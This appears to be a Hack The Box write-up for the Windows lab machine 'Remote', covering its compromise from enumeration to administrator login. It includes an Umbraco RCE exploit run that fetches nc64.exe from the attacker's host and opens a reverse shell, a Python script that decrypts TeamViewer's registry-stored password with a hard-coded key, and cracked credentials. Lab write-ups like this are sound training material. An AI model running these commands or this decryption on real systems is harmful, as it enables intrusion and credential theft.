---
icon: windows
---

# Remote - Easy

<figure><img src="../../.gitbook/assets/image (28) (1) (1) (1).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/remote"><strong>Remote</strong></a></p></figcaption></figure>

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```shellscript
## Nmap TCP
nmap -A -T4 -p- -Pn 10.10.10.180 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-28 20:19 EST
Nmap scan report for 10.10.10.180
Host is up (0.049s latency).
Not shown: 65519 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind?
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=11/28%OT=21%CT=1%CU=32304%PV=Y%DS=2%DC=T%G=Y%TM=692A4A
OS:98%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS
OS:=U)SEQ(SP=105%GCD=1%ISR=104%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=107%GCD=1%IS
OS:R=10A%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=108%GCD=1%ISR=10C%TI=I%CI=I%II=I%S
OS:S=S%TS=U)SEQ(SP=FF%GCD=1%ISR=107%TI=I%CI=I%II=I%SS=S%TS=U)OPS(O1=M542NW8
OS:NNS%O2=M542NW8NNS%O3=M542NW8%O4=M542NW8NNS%O5=M542NW8NNS%O6=M542NNS)WIN(
OS:W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF
OS:%O=M542NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y
OS:%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%R
OS:D=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%
OS:S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(
OS:R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0
OS:%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: 1h00m00s
| smb2-time: 
|   date: 2025-11-29T02:20:54
|_  start_date: N/A

TRACEROUTE (using port 23/tcp)
HOP RTT      ADDRESS
1   88.41 ms 10.10.16.1
2   24.26 ms 10.10.10.180
```

### <mark style="color:$primary;">HTTP 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Couple of references to Umbraco, but not  much else on the site. By default Umbraco has it's admin panel page located at `/Umbraco` . And it is the case here as well

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

FTP and SMB have nothing for us. The one port that stands out the most is 2049 mountd NFS&#x20;

### <mark style="color:$primary;">NFS Port 2049 \[mountd]</mark>

```shellscript
showmount -e 10.10.10.180
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

There appears to be a mounted share here that is visible by everyone!

I'll mount it to `/mnt/mount` on my machine

```shellscript
sudo mount -t nfs -o nolock 10.10.10.180:/site_backups /mnt/mount
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now I have access to the backup of the web directory:

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Found an `.sdf` file in App\_data. `.sdf` files are standard database format files. Running strings on the file seems to do the trick as it unveils an admin user and his hash!

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```shellscript
admin@htb.local:b8be16afba8c314ad33d812f22a04991b90e2aaa
```

Crackstation managed to crack it right away:

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```shellscript
admin@htb.local:baconandcheese
```

These credentials work on the Umbraco Admin panel!

### <mark style="color:$primary;">Umbraco CMS 7.12.4 Authenticatd RCE</mark>

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Clicking on the ? we get the version of Umbraco. A quick goolge search reveals an RCE POC on github

{% embed url="https://github.com/noraj/Umbraco-RCE" %}

I'll clone it to my machine:

```shellscript
git clone https://github.com/noraj/Umbraco-RCE.git
```

Let's test it out:

{% code overflow="wrap" %}
```bash
python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c whoami
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nice it works, now let's get a shell on the system I'll download nc64.exe to the target machine and run it to get a shell.

{% code overflow="wrap" %}
```shellscript
python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell -a 'wget 10.10.16.2/nc64.exe -O C:/Users/Public/nc64.exe'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now run the following command to get a reverse shell, but make sure you have a listener ready first

{% code overflow="wrap" %}
```shellscript
python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell -a 'C:/Users/Public/nc64.exe 10.10.16.2 135 -e powershell.exe'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

SeImpersonatePrivilege would be the easy way out using a potato attack. But this is not the route the box has intended for us.

### <mark style="color:$primary;">Manual Enumeration</mark>

If you check the tasklist something is going to stand out immediately

<figure><img src="../../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

TeamViewer is a remote management software. Since this is a server, it will have credentials used for others to connect into it

<figure><img src="../../.gitbook/assets/image (16) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

If we check the program files we will find a verison!

A quick google search about this version and we come up with the following

<figure><img src="../../.gitbook/assets/image (2916).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://whynotsecurity.com/blog/teamviewer/" %}

The above blog says the encrypted password is stored in registry key **SecurityPasswordAES** or **OptionsPasswordAES** Let’s check it out:

```shellscript
reg query HKLM /f SecurityPasswordAES /s
```

<figure><img src="../../.gitbook/assets/image (2917).png" alt=""><figcaption></figcaption></figure>

Nice we got the password:

```
FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
```

The blog also provdies us with the python scirpt to decrypt the password:

```python
import sys, hexdump, binascii
from Crypto.Cipher import AES

class AESCipher:
    def __init__(self, key):
        self.key = key

    def decrypt(self, iv, data):
        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self.cipher.decrypt(data)

key = binascii.unhexlify("0602000000a400005253413100040000")
iv = binascii.unhexlify("0100010067244F436E6762F25EA8D704")
hex_str_cipher = "FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B"			# output from the registry

ciphertext = binascii.unhexlify(hex_str_cipher)

raw_un = AESCipher(key).decrypt(iv, ciphertext)

print(hexdump.hexdump(raw_un))

password = raw_un.decode('utf-16')
print(password)
```

<figure><img src="../../.gitbook/assets/image (2918).png" alt=""><figcaption></figcaption></figure>

We found a password&#x20;

```shellscript
!R3m0te!
```

```shellscript
netexec winrm 10.10.10.180 -u administrator -p '!R3m0te!'
```

<figure><img src="../../.gitbook/assets/image (2919).png" alt=""><figcaption></figcaption></figure>

The password works for the admin user let's login as him!

```sh
evil-winrm -i 10.10.10.180 -u administrator -p '!R3m0te!'
```

<figure><img src="../../.gitbook/assets/image (2920).png" alt=""><figcaption></figcaption></figure>
